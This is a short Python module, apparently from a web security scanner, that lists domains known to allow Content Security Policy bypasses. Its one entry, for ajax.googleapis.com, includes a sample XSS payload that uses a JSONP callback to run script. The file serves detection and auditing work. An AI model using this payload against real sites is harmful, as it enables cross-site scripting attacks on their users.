"""
Common domains that contain known CSP bypasses
"""
# pylint: disable=C0301


CSP_KNOWN_BYPASSES = {
    "script-src": [
        # (DOMAIN, DESCRIPTION/EXAMPLE,)
        ("ajax.googleapis.com", '''
Additional information is available here:  https://github.com/cure53/XSSChallengeWiki/wiki/H5SC-Minichallenge-3:-%22Sh*t,-it%27s-CSP!%22

Example Payload:
"><script src=//ajax.googleapis.com/ajax/services/feed/find?v=1.0%26callback=alert%26context=1337></script>
'''),
    ]
}
